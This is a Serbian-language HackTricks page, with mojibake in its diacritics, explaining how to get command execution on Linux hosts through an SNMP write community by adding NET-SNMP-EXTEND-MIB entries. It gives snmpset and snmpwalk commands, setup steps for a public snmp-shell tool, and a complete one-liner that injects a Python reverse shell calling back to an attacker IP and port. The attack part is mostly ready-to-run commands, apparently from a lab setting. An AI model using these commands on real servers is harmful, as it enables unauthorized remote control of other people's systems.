<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

# SNMP RCE

SNMP mo쬰 biti iskori코캖en od strane napada캜a ako administrator previdi njegovu podrazumevanu konfiguraciju na ure캠aju ili serveru. Zloupotrebom SNMP zajednice sa dozvolama za pisanje (rwcommunity) na Linux operativnom sistemu, napada캜 mo쬰 izvr코iti komande na serveru.

## Pro코irivanje usluga sa dodatnim komandama

Da biste pro코irili SNMP usluge i dodali dodatne komande, mogu캖e je dodati nove redove u "nsExtendObjects" tabelu. To se mo쬰 posti캖i kori코캖enjem `snmpset` komande i pru쬬njem neophodnih parametara, uklju캜uju캖i apsolutnu putanju do izvr코nog fajla i komandu koja 캖e biti izvr코ena:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## Ubacivanje komandi za izvr코avanje

Ubacivanje komandi za izvr코avanje na SNMP servisu zahteva postojanje i izvr코ivost pozvanog binarnog/skriptnog fajla. **`NET-SNMP-EXTEND-MIB`** zahteva pru쬬nje apsolutne putanje do izvr코nog fajla.

Da bi se potvrdilo izvr코avanje uba캜ene komande, mo쬰 se koristiti `snmpwalk` komanda za enumeraciju SNMP servisa. **Izlaz 캖e prikazati komandu i njene povezane detalje**, uklju캜uju캖i apsolutnu putanju:
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## Pokretanje uba캜enih komandi

Kada se **uba캜ena komanda pro캜ita, izvr코ava se**. Ovo pona코anje je poznato kao **`run-on-read()`**. Izvr코enje komande mo쬰 se posmatrati tokom 캜itanja snmpwalk.

### Dobijanje server ljuske pomo캖u SNMP-a

Da biste preuzeli kontrolu nad serverom i dobili server ljusku, mo쬰 se koristiti Python skripta koju je razvio mxrch sa adrese [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git).

Alternativno, mo쬰 se ru캜no kreirati reverzna ljuska ubacivanjem odre캠ene komande u SNMP. Ova komanda, pokrenuta snmpwalk-om, uspostavlja reverznu vezu ljuske sa napada캜evim ra캜unarom, omogu캖avaju캖i kontrolu nad rtvinim ra캜unarom.
Mo쬰te instalirati prethodne uslove za pokretanje ovoga:
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
Ili obrnuti shell:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## Reference
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
